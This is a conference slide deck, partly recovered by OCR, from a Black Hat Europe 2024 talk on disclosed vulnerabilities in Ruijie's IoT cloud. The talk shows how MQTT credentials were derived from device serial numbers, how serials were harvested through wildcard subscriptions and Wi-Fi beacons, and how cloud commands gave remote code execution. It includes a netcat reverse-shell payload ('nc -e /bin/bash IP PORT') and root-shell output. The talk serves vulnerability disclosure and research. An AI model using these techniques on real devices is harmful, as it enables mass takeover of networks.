---
title: "The Insecure IoT Cloud Strikes Again RCE on all Ruijie Cloud-Connected Devices"
speakers: ["Noam Moshe", "Tomer Goldschmidt"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/Noam Moshe & Tomer Goldschmidt_The Insecure IoT Cloud Strikes Again RCE on all Ruijie Cloud-Connected Devices.pdf"
pages: 101
sha256: "d39acbf9bff418e7ad085d01bc84d25ddf40075c85ae35d2c4869f085e43bcc9"
text_chars: 21550
ocr_pages: 40
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:52:09Z"
---
# The Insecure IoT Cloud Strikes Again RCE on all Ruijie Cloud-Connected Devices

**Speakers:** Noam Moshe, Tomer Goldschmidt  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/Noam Moshe & Tomer Goldschmidt_The Insecure IoT Cloud Strikes Again RCE on all Ruijie Cloud-Connected Devices.pdf` (101 pages)


## Slide 1

**The Insecure IoT Cloud Strikes Again: RCE on all Ruijie Cloud-Connected Devices** Noam Moshe, Tomer Goldschmidt Claroty Research, Claroty Team82

## Slide 2

###### **$whoami**

**Noam Moshe** Vulnerability researcher - mostly breaking IoT clouds. Master of Pwn @ Pwn2Own ICS 2023.

**Tomer Goldschmidt** Vulnerability researcher - Specialize in embedded research

## Slide 3

I   good
WIFI names

It hurts when IP

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
wt! Verizon LTE 5:58 PM 79 97%
< Settings Wi-Fi
Hover Board az@
Jail Bird Joey az@
Lone Pine ae @
I yy ood It hurts when IP az@
g Mr. Fusion ae @
NextHome-5G ac @
WIFI NAMES eres sec
OMGLibyans az@
Power Of Love az@
Slacker ae @
Space Time aze@
Strickland az@
```

## Slide 4

# **Can we hack it?**

It hurts when IP

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
wt! Verizon LTE 5:58 PM 79 97%
€ Settings Wi-Fi
Hover Board as @)
Jail Bird Joey as @)
Lone Pine as @
Ca Nn We It hurts when IP az@
Mr. Fusion ac @
h k - o? NextHome-5G as ®
ac It | Old Man Peabody aez@
OMGLibyans as ®
Power Of Love ac @
Slacker as fa)
Space Time acs @
Strickland aes @
```

## Slide 5

**That’s exactly what we** **did in Ruijie!**

## Slide 6

**But how??**

## Slide 7

## **But how?? Using the cloud!**

## Slide 8

**We hacked the AP!**

It hurts when IP

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
et! Verizon LTE 5:58 PM 7997,
< Settings Wi-Fi
Hover Board a
eee Jail Bird Joey a
a Lone Pine a
Mad Dog a
vy
Mr. Fusion a
NextHome-5G a
By ’ By ”
”)
SCRICHECHECERECRECEECRECRECRECHECHEC)
Old Man Peabody a>
We hacked aa “
<«----»|  |t hurts when IP ac
th e A Pp I Slacker af
a
Space Time a?
Strickland ae
```

## Slide 9

**Not only that…**

## Slide 10

**We can hack ALL devices (40,000+)!**

## Slide 11

## **Today we’ll show you how**

## Slide 12

##### **Ruijie Networks**

- **Network device manufacture** **r**

   - Routers, Access Points, NMS …

- **Used around the world**

   - Consumer, Enterprise, Gov.

## Slide 13

**Ruijie Reyee OS Lineup**

## Slide 14

##### **Ruijie Reyee OS Lineup**

- Provides WiFi access

- Cloud-enabled

- Support mesh configurations

## Slide 15

##### **The Usual Attack Surface**

- Web

- SSH

- SNMP

- More?

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Usual Attack Surface
« \/eb + ~ sudo nmap -sS -F 192.168.10.3
Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-04 15:24 IST
e SSH Nmap scan report for 192.168.10.3
Host is up (@.0@14s Latency).
° SNMP Not shown: 96 closed tcp ports (reset)
PORT STATE SERVICE
More? 23/tcp open telnet
53/tcp open domain
8@/tcp open http
443/tcp open https
MAC Address: 10:82:3D:DB:83:65 CRuijie Networks)
Nmap done: 1 IP address (1 host up) scanned in @.17 seconds
```

## Slide 16

## **However, we want more…**

## Slide 17

###### **Attacker**

**Internet (WWW)**

**Router Ruijie AP (NAT/FW)**

## Slide 18

Oh we ll… **Let’s use the cloud instead**

## Slide 19

##### **Ruijie Reyee Cloud Platform**

• **Manage** facility networks

• Remote device **configuration**

• Network **monitoring**

## Slide 20

**Ruijie Reye Cloud Platform**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ruijie Reye Cloud Platform
Project Al Heatmap
X Device Information
Ruijie 2 @ Synced
SN:1111111111111 Model:RAP2260 Management !IP:192.168.110.10 Device Utilization: Memory 0°
Ny Configuration
[Dees]
Overview Log History Wireless Experience
| Status
```

## Slide 21

**Device Provisioning**

## Slide 22

#### **Initial Connection**

Hi
My SN is:
G1RP16FF42190

Ruijie

## Slide 23

#### **Initial Connection**

Checking
G1RP16FF42190
...
Ruijie

## Slide 24

#### **Initial Connection**

Approved
Ruijie

## Slide 25

## **Now the user can claim their device**

Ruijie

## Slide 26

**Part #2: Claiming the Device**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Part #2: Claiming the Device
Add Device —— Select the dev
AP
You can add an AP in one of the following four modes (click to switch mode):
By entering device SN By batch adding using an excel file
1SN: Alias: +
| Back | | Cancel |
```

## Slide 27

**Part #2: Claiming the Device**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Part #2: Claiming the Device
Add Device
AP
You can add an AP in on
By entering device S'
1SN:
Scan to Aad
Back
pena ane
```

## Slide 28

###### **Part #2: Claiming the Device**

1111111111

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Part #2: Claiming the Device
Add Device —* Select t
AP
You can add an AP in one of the following four modg to switch mode):
By entering device SN By batch addi an excel file
1SN: 1111111111 Alias: +
Back | | Cancel |
```

## Slide 29

**Result: Device Cloud Access**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Result: Device Cloud Access
Al Heatmap
X | Device Information
Management !IP:192.16 0 Device Utilization: Mem
Configuration
[ou]
Overview Log History Wireless Experience
| Status
Associated Link
® Ruijie ® Ruijie © Ruijie ® Ruijie
```

## Slide 30

##### **Device & Cloud Communication**

- _status-notify_ messages

**Ruijie Cloud**

- _keep-alive_ messages

- Over The Air (OTA) updates

   - config changes

   - • firmware updates

## Slide 31

**Let’s Research More**

## Slide 32

##### **Ruijie RG RAP Access Point**

- <u>URL</u>

- • Download firmware -

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ruijie RG RAP Access Point
* Download firmware - URL
Reyee
—_—-
Ie uyle Products Solutions Support Community About Us
Software
Ruijie RG-RAP2260G Series Access Point Firmware
Type
Version No. ReyeeOS230
```

## Slide 33

**File Entropy - Probably Encrypted**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
File Entropy - Probably Encrypted
Entropy
Offset le7
```

## Slide 34

**So, how do we continue?**

## Slide 35

###### **Extracting The Firmware - Technique #1**

**Going back** **in tim e** At some point it wasn’t encrypted

## Slide 36

**Extracting The Firmware - Technique #2 Hardware** **hack ing** Dump the flash chip

## Slide 37

###### **Extracting The Firmware - Technique #3**

**Finding a vulnerability to gain a local shell**

## Slide 38

**We chose to find an RCE**

## Slide 39

## Slide 40

**Found a RCE → We have shell Access**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Found a RCE — We have shell Access
+ ruijie nc -lvk 9900
/bin/sh: can't access tty; job control turned off
BusyBox v1.28.4 ©) built-in shell Cash)
/ #id
uid=@Croot) gid=@Croot)
/#i
```

## Slide 41

##### **Firmware Decryption**

Searching for the decryption component

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Firmware Decryption
Searching for the decryption component
/usr/sbin # 1s *upgrade*
rg-upgrade-crypto « sarade_compat.sh
/usr/sbin #
```

## Slide 42

**Firmware Decryption Analyzing rg-upgrade-crypto**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Firmware Decryption
Analyzing rg-upgrade-crypto
if ( == 8) {
memset(__s,6,4);
——~s
sVar2 = read(local_d4,__s, 0x16);
if (sVar2 != 0x16) goto LAB_0040148c;
Llocal_cce = local_cc - 6x16;
}
else ff
sVar2 = write(local_d®, “upgrade_crypt_v1!@2021" 0x16);
if (sVar2 != 0x16) goto LAB_0040148c;
}
```

## Slide 43

**Firmware Decryption** This string seems familiar…

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Firmware Decryption
This string seems familiar.
_"“upgrade_crypt_v1!@2021" 6x16):
5
a 62 Llocal_cc = local_ce - 6x16:
2
else 4
sVar2 = write(Lotat.d8 |"upgrade_crypt_v
if (sVar2 != 68x16) goto LAB_8840148c;
}
```

## Slide 44

##### **Firmware Decryption**

String is present in the encrypted frmwar i e

**Found our target!**

## Slide 45

**Symmetric Encryption Scheme - Rolling XOR (^) + Shift**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Symmetric Encryption Scheme - Rolling
XOR (4) + Shift
for (local_ic = 09; local_ic < : local_ic = local_ic + 1) {
cVari1 = (char)_DAT_00411b18;
cVar2 (char) _DAT_00411b1ic;
uVar4 (uint)_DAT_00411bic >> 8;
uVar3 (uint)_DAT_00411bic >> 0x10;
for (local_18 = 0; (int)local_18 < 6; Local_18 = local_18 + 1) {
(& )[local_18] = (& )[lLocal_18];
/* WARNING: Ignoring partial resolution of indirect «/
= cVar1 + cVar2 + (char)uVar4 + (char)uVar3 & 1;
TG_key_chr = 0;
for (local_18 = 8; (int)local_18 < 8; lLocal_18 = local_18 + 1) {
TG_key_chr = )[local_18] << (local_18 & 0x1f~e{ T6_key_chr;
[local_ic] = [local_ic] * TG6_key_chr;
```

## Slide 46

**Emulating The Binary-Decryptor**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Emulating The Binary-Decryptor
=
1 directory, 5 files
```

## Slide 47

**Emulating The Binary-Decryptor**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Emulating The Binary-Decryptor
sudo chroot . /qemu-mipsel-static /rq-crypto-upgrade.bin
file ./decrypted firmware.bin
./decrypted firmware.bin: POSIX tar archive (GNU)
tar -xvf ./decrypted firmware.bin
sysupgrade-RAP2261G/
sysupgrade-RAP2261G/CONTROL
sysupgrade-RAP2261G/root
sysupgrade-RAP2261G/kernel
```

## Slide 48

##### **Emulating The Binary-Decryptor**

**• CONTROL** - hardware version

- **kernel** - Linux kernel

- **root** - squashfs filesystem

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Emulating The Binary-Decryptor
e CONTROL- hardware version
e kernel - Linux kernel
e root - squashfs filesystem
sudo chroot . /qemu-mipsel-static /rg-crypto-upgrade.bin
file ./decrypted firmware.bin
./decrypted firmware.bin: POSIX tar archive (GNU)
tar -xvf ./decrypted firmware.bin
sysupgrade-RAP2261G/
sysupgrade-RAP2261G/CONTROL
sysupgrade-RAP2261G/root
sysupgrade-RAP2261G/kernelL
```

## Slide 49

## Slide 50

##### **Gameplan**

- RE main **cloud binary**

- Search for **Protocols**

   - MQTT, WS, HTTP …

- Focus:

   - Device **auth**

   - Hardcoded **secrets**

   - **• Endpoints**

## Slide 51

##### **Finding Cloud Service**

- Look at

**/etc/init.d** to search for startup binaries

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Finding Cloud Service
¢ Look at
/etc/init.d
to search for
startup binaries
/ # 1s /etc/init.d/
aaa
alarm
ap_portal
apmgr
arp_static
bluetooth
boot
cls-sshd
config_update
crash_info
cron
dhcp_snp
dhcpmon
dnsmasq
domain_proxy
dotixd
dropbear
easyson
elisten
enet_disp
factory
firewall
firmware.sh
frame_init
fstab
ip_conflict_check
ipv6nei
kLogd
Lighttpd
1ldpd
Local_topoLlogy
manager_ip
mosquitto
mqlink
msw_ncdb_proxy_init
network
network_check
network_monitor
radius
redbs_init
rg-passwd
rg-power-mgt
rg_dev_selfchk
rg_led
rg_led_stop
rg_mtdoops
rg_sys
rg_syslog
rg_wifi_services
rlog
roam
schedule
smp
snmpd
stad
sysctl
sysfixtime
sysinfo
sysinfo_sw_cap
syslogd
sysntpd
system
telnet
```

## Slide 52

##### **Finding Cloud Service**

- Look at **/etc/init.d** to searc h for st artup binaries

- **grep** for cloud-related strings

• Endpoints, protocols…

## Slide 53

##### **Finding Cloud Service**

- Look at **/etc/init.d** to searc h for st artup binaries

- **grep** for cloud-related strings

- Find custom configuration

**• /etc** , **/opt** …

## Slide 54

##### **Found the Binary!**

**Cloud binary is** mqlink.elf

## Slide 55

##### **mqlink.elf Analysis**

- Look for protocol strings

   - **MQTT:** paho, _mosquitto,_ mqtt[s]://

   - **WS:** ws[s]://, Upgrade: websocket

   - **VPN** : openvpn, .vpn

   - **HTTP** : http[s]://, GET, POST

## Slide 56

**In our case, MQTT was used**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
+ ruijie strings mglink.elf | grep mosquitto
Libmosquitto.so.1
mosquitto_connack_string
mosquitto_Lib_cLleanup
mosquitto_will_clear
mosquitto_pubLish
mosquitto_strerror In our Case,
mosquitto_Lib_init
mosquitto_disconnect_calLback_set MQTT Was
mosquitto_topic_matches_sub
mosquitto_tLs_insecure_set used
mosquitto_tLs_opts_set
mosquitto_username_pw_set
mosquitto_connect
mosquitto_subscribe
mosquitto_wiLl_set
```

## Slide 57

##### **MQTT 101**

- Messaging protocol • Pub Sub

   - Communicate over topics

- Broker distributes messages

   - Everyone connects to it

## Slide 58

##### **Requirements**

- What we need for MQTT:

   - Broker host address

   - CA/certificate for broker

   - • Client certificate/key

   - • Client credentials

## Slide 59

**Let’s break it down!**

## Slide 60

##### **Requirements**

• What we need for MQTT: • Broker IP/DNS

**In the config**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Requirements
«What we need for MQTT:
¢ Broker IP/DNS
/ # cat /etc/config/mqlink
config mqlink
option enable '1' In the
option port '25857' config
option addr 'mqclt0Q1-eu.rj.Link'
option domainSuffix ‘rj. Link’
option tlscafil '/etc/mqlink/ca/rj.link.pem'
retransPeriod
```

## Slide 61

##### **Requirements**

- What we need for MQTT:

   - **Broker IP/DNS**

   - • CA/certificate of broker

**In the config (also can extract from TLS endpoint)**

## Slide 62

##### **Requirements**

- What we need for MQTT:

   - **Broker IP/DNS**

   - **CA/certificate for broker**

   - ~~Client certif~~ i ~~cate/key~~

- **No mTLS: No client**

**certificate**

## Slide 63

##### **Requirements**

- What we need for MQTT:

   - **Broker IP/DNS**

   - **• CA/certificate for broker**

   - ~~Client certif~~ i ~~cate/key~~

**Let’s RE the cloud binary!**

- **Client Credentials**

## Slide 64

##### **MQTT Creds Generation (CVE-2024-45722) - mqlink.elf**

**• Username** : Serial Number

## Slide 65

##### **MQTT Creds Generation (CVE-2024-45722) - mqlink.elf**

**• Username** : Serial Number **• Password** :

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MQTT Creds Generation (CVE-2024-45722) -
malink.elf
e Username: Serial Number
¢ Password:
SN
Serial Number
WIM Ps
S/N: G1
memset (auStack_1c,®,0x1®);
iVar2 = string_reverse(auStack_lc,
if (iVar2 == @) {
iVar2 = sha256(TG_out, auStack_ic);
if’ (AVan2 =z 08) +
QH8ZZ
——=—
String Reverse
=
SHA256
—
Rupe | }Reyee |
SN);
——=— ==
MQTT Password
```

## Slide 66

##### **Requirements**

- What we need for MQTT:

   - **Broker IP/DNS**

   - **CA/certificate for broker**

   - ~~Client certif~~ i ~~cate/key~~

   - **• Client Credentials (needs SN)**

## Slide 67

**But how do we get an SN?**

## Slide 68

**Serial Numbers leaked on Youtube…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
©) VouTube
Serial Numbers
leaked on
Youtube...
| Gateway List
| Add | Web CLI | eWeb | | More ¥ 0 Selected
Status 4 SN Alias MGMT IP
© Online Ruijie 192.168.200.168
€ ¢
.
_  —a
Wireless Access Point
Model: RG-EST100-E Rufie | Reyee
Version: V1.00
```

## Slide 69

**We can Connect!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
We can Connect!
+ ruijie python3 mgtt.py
Connected with result code Sending CONNECT (ul, pl,
Connected with result code Received CONNACK (@, 0)
Connected with result] code @
CONNACK Packet
There are only 6 return codes in the CONNECT packet. Only when the return
code of the CONNACK packet sent back by the server is 0, the connection is
successfully established.
Value Return code Description
[c] 0x00 Connection accepted Connection accepted
```

## Slide 70

**We can Connect!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
We can Connect! (7
+ ruijie python3 mqtt.py
Connected with result code Sending CONNECT (ul, pl,
Connected with result code Received CONNACK (@. 0)
Value Return code Description
[o] 0x00 Connection accepted Connection accepted
successfully established.
Value Return code Description
[co] 0x00 Connection accepted Connection accepted
```

## Slide 71

##### **Ruijie MQTT Topics**

- **Device to cloud** : used for notifications ( **publish** )

   - **cloud/sync** - keepalive, status

   - **• cloud/config_change** - config change

   - **• cloud/event** - events like reboot, update

   - **• cloud/state_change** - topology changes

## Slide 72

##### **Ruijie MQTT Topics**

**• Cloud to device** : used for OTA updates **(subscribe)**

- **device/{SN}** - send commands to device

## Slide 73

##### **Can We Do the Opposite?**

**• Device to cloud** : used for notifications ( **~~publish~~ subscribe!)**

- **cloud/sync**

- **cloud/config_change**

- **• cloud/event**

- **cloud/state_change**

## Slide 74

#### **We got bombarded with messages!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
We got bombarded
with messages!
cloud/sync b'{ "sn": "G1Q ", "id": "0000000594", “bizid": "syn_SON_@", "ts":
1708432476453, “ack": "true", "data": { "pro": "RAP2200(E)", "mac": "eck ay b
"1,11", "swv": "ReyeeOS 2.262.0.2301;AP_3.0(1)B11P262,Release(10230121)", "wmd": "AP,1,
el Dees u10550.3 105. "Lnid": wa Me wlGide: "Or, Late alge Pg a
"mastersn": "G Lome Statusw-. CONF MTGIums per
```

## Slide 75

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
»
fom™ AX
=
hee j
Wait a minute,
who are you?
```

## Slide 76

### **Messages Contain SN!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Messages
Contain SN!
cloud/sync b'{ "sn": "G1Q ", "id": "0000000594", “bizid": "syn_SON_@", "ts":
1708432476453, “ack": "true", "data": { "pro": "RAP2200(E)", "mac": "eck ;
"1,11", "swv": "ReyeeOS 2.262.0.2301;AP_3.0(1)B11P262,Release(10230121)", "wmd": "AP,1
el Dees u10550.3 105. "Lnid": wa Me wlGide: "Or, Late alge Pg a
"mastersn": "G Lome Statusw-. CONF MTGIums per
```

## Slide 77

**~50,000 SN!**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
cat serials.txt | uniq | sort | subl
~50,000 SN!
```

## Slide 78

##### **What we have so far ?**

- We can impersonate any device • Using their SN

- Can DoS devices

   - Disconnect MQTT

   - • Send false data

- Can we achieve **RCE** ?

## Slide 79

##### **What we have so far ?**

- We can impersonate any device • Using their SN

- Can DoS devices

   - Disconnect MQTT

   - • Send false data

- Can we achieve **RCE** ?

## Slide 80

##### **Ruijie MQTT Topics**

- Since we know all SNs, we can now **subscribe** to: **• device/{SN}** - send commands to device

- However ~50,000 **subscribes** is a lot of work..

- Can we improve it?

## Slide 81

##### **MQTT Topics Construction**

- MQTT Topics:

   - Composed of levels

   - • separated by /

**first/second/third/...**

## Slide 82

##### **MQTT Topics Construction**

- Supports wildcard

   - **Single level wildcard** - **first _** **level/+/third**

   - **Multi level wildcard** - # (must be at the end) **first _** **level/#**

## Slide 83

##### **Using Wildcards**

- Lets subscribe to using **device/{SN}** wildcards • **device/+**

- We got all cloud commands to devices!

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Using Wildcards
¢ Lets subscribe to using device/ {SN} wildcards
° device/+
¢ We got all cloud commands to devices!
device/G 1 b'{"data": Li i
AN" noipdns\\"" Lid": " 1708432476986} '
device/G odule
\\"access_ctrl\\" a 7 types" ts":1708432476996} '
device/G :["dev_config get ——-module
\\"flowctrl_udp\\""],"id": ")"type":"cmd","ts":1708432476997}'
device/G b'{"data": ["dev_sta set --module \\"configChange\\"
VAM url\\"\\"https://deviceapi-eu. ruijienetworks.com/service/api/enet/dq
\\"'function\\":\\"ac_config\\", \\"independ\\": \\"false\\",\\"networkId\\":
md", ""ts":1708432477007}'
```

## Slide 84

##### **device/+ Using Wildcards -**

- •Lets subscribe to using **device/{SN}** wildcards • device/ **+**

- •We got all cloud commands to devices!

## Slide 85

##### **Command-Execution-as-a-Service**

• Cloud command:

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Command-Execution-as-a-Service
* Cloud command:
"data":
[
J,
adits i As
"type": "cmd",
"ts": 1708432476997
“dev_config get —-module \"flowctrl_udp\""
(OSiGommand
```

## Slide 86

##### **Command-Execution-as-a-Service**

• Sending a message ⇒ RCE on a device

- But can we send one?

## Slide 87

##### **Command-Execution-as-a-Service**

- We tried sending a message…

## Slide 88

##### **Command-Execution-as-a-Service**

• Of course it worked… (CVE-2024-52324)

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Command-Execution-as-a-Service
¢ Of course it worked... (CVE-2024-52324)
Sending PUBLISH ‘b'device/G1 ... €406 bytes)
Received SUBACK
Received PUBLISH ‘device/G1I ... (406 bytes)
* ruijie nc -lvk 9900
/bin/sh: can't access tty; job control turned off
BusyBox v1.28.4 () built-in shell Cash)
/#id
uid=@(root) gid=@Croot)
```

## Slide 89

**RCE on ALL Cloud Devices**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
RCE on ALL Cloud Devices
"data":
[
"nc —-e /bin/bash IP PORT"
I,
Tide: 2357611419" |
“type”: cmd...
"ts": 1712477881003
* ruijie nc -lvk 9900
/bin/sh: can't access tty; job control turned off
BusyBox v1.28.4 ©) built-in shell Cash)
/#id
uid=@Croot) gid=@Croot)
/#]
```

## Slide 90

##### **Open Sesame Attack**

- Mass scale RCE is not always viable

   - Specific target

- Let’s showcase this kind of attack!

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Open Sesame Attack
¢ Mass scale RCE Is not
always viable
¢ Specific target
« Let's showcase this kind
of attack!
THIS PLACE
IN PARTICULAR
```

## Slide 91

##### **Open Sesame**

- Let’s go back to our first example

Airport WIFI free

- Hacking a WIFI

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Open Sesame ial
Hover Board az@
Jail Bird Joey az@
* Let's go back to our first sone Pine _—
example Airport WIFI free a=@®
* Hacking a WIFI Mr. Fusion =O
NextHome-5G ae @
Old Man Peabody az@
OMGLibyans az@
Power Of Love az@
Slacker az7@
Space Time az@
```

## Slide 92

**Ruijie Access Points**

## Slide 93

**Ruijie Access Points**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WV)
J
=
O
Qa
WY
VW)
®
O
O
<
A
—_
>
~
```

## Slide 94

##### **Open Sesame**

- Mac OSX supports raw Wi-Fi sniffing (through wireless diagnostics)

- Dump WIFI beacons messages

## Slide 95

**We have the SN! (CVE-2024-47146)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
We have the SN! (cVE-2024-47146)
49 1.540390 a Broadcast 802... 'ildcard (Broadcast)
ABCDEFG"
512 Beacon frame, SN=4006, FN=0, Flag:
0000 08 00 24 00 Gf 08 00 40 dil 9b b9 74 G8 0G 00 20
MUAC VO Raremeter:Record 2010 10 @2 8f 09 80 04 dd ad 0 00 00 10 18 03 04 20
Tag: Vendor Specific: Ralink Technology, Corp. 0020 20 Ge 5c 89 80 00 00 00 ff ff ff ff ff finn;
Tag Number: Vendor Specific (221) 0030 i r t 97 uWiIEl
Tag length: 7 0040 2 00 00 00 64 O@ 21 1c 0 O7 41 42 43 44 45 46
QUI: 00:0c:43 (Ralink Technology, Co 0050 47 01 08 82 84 8b 96 12 24 48 Gc 03 01 «Name:
Vendor Specific OUI Type: 8 0060 @@ 01 00 @@ 07 06 55 53 20 O1 Ob 1e 20 01-vv
Vendor Specific Data: 08000000 0070 02 16 00 c3 02 10 2f 46 05 73 00 01 60 00 33 08
: eae Maa 0080 54 05 6 07 O8 09 da Gb 2a 01 00 32 04 Oc 18 30
Tag; veneer SOS: eee st as 0090 60 Ob 05 QO 0 19 12 7a Gb 09 00 00 08 10 82 3d
oo Se? BENSOP BBREA ee 00a0 db 83 67 Gc 02 7f 00 2d 1a ef 19 17 ff ff 00 00
00b0 08 8 00 20 00 00 00 20 00 20 0 0 00 a0 18 04
00cO 87 09 QO 3d 16 08 02 G0 G0 20 00 G0 00 0 a0 00
Vendor Specific OUI Type: 136 20d 08 00 08 G2 G0 00 00 OO 22 OO OO 4a Ve 14 20 Va
Vendor Specific Data: Sn 8 ml mmm «=: Re 00 2c 01 cB GO 14 OB 05 00 19 OO bf @c b1 79 c9
Tag: FILS Indication 00f0 33 fa ff 68 01 fa ff 68 01 x ee ee ce @@ fc if 3-h
Tag Number: FILS Indication (240) Bree) ey on Corboree CoA Pece bei ‘@
Tag “length: 2 ; - 0120 62 32 2f 00 ff 1a 2 *AP:Serial Number. H:
Prey G = Number of Public Key Identifiers: 0 0130 92 6f 09 af 08 00 Oc 00 fa ff fa ft ic e7 71
= Number of Realm Identifiers: 0 0140
= FILS IP Address Configuration: Not supporte 9150
= Cache Identifier: Not included 0160
= HESSID: Not included 9170
FILS Shared Key Authentication without PFS: 0180
FILS Shared Key Authentication with PFS: No 2198
00 47 31
- i icati C120 (63 55 ae ee ee ee 00 00 00 00 00)
eens = FILS Public Key Authentication: Not support @1b0 0 00 b9 63 44 0a 64 e8 10 ff ff ff ff 2 00 00
0000 .... ..+. «++. = Reserved: 0x0 1c0 0 08 OO 20 20 20 20 0 20 00 20 00 00 00 a0 00
Tag: Vendor Specific: (null) Q@1d®@ 00 00 QO 00 02 00 20 GO 20 dd 09 80 05 88 ef 01
Tag Number: Vendor Specific (221) | O1e0 @@ 04 01 31 3b ac 46 a3
```

## Slide 96

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q1
32
6f
Q7
00
00 28 00 weSeQund
pe 04 00
uWIEl -
44 45 46
ise
00 33 08
@c 18 30
10.27 24
2AP.oe
64 e8 10 ff ff ff ff 00 00
‘bigs
50 00 00 08 00 47
7A
26
00
```

## Slide 97

##### **Building an Open Sesame**

**• Step 1** : Be physically close to y our targ et **• Step 2** : sniff raw WiFi beacon frames, which contain the device SN

**• Step 3** : Use the SN to target the AP through the cloud **• Step 4** : ???

**• Step 5** : profit.

## Slide 98

**Ruijie Access Points**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ruijie Access Points
\
ft
—)- ruijie nc -lvk 9900
)/bin/sh: can't access tty; job control turned off
BusyBox v1.28.4 ©) built-in shell Cash)
/ #id
uid=@(Croot) gid=@Croot)
```

## Slide 99

##### **Responsible Disclosure**

- We reported these vulnerabiliti es to R uijie • All vulnerabilities were fixed by Ruijie in a swift and professional manner

- We thank Ruijie Networks and CISA for their professionalism

- **CVE-2024-47547, CVE-2024-42494, CVE-2024-51727, CVE-2024-47043, CVE-2024-45722, CVE-2024-47791, CVE-2024-46874, CVE-2024-48874, CVE-2024-52324, CVE-2024-47146**

## Slide 100

##### **Takeaways**

- Automatic cloud provisioning is a super-interesting attack vector!

   - Bypass NAT protection

- Secure user authentication is easy, secure device authentication is hard

   - Vendors trust devices - gives room for attackers

   - Many vendors use insecure identifiers as credentials (SN, MAC etc)

## Slide 101

**Questions?**
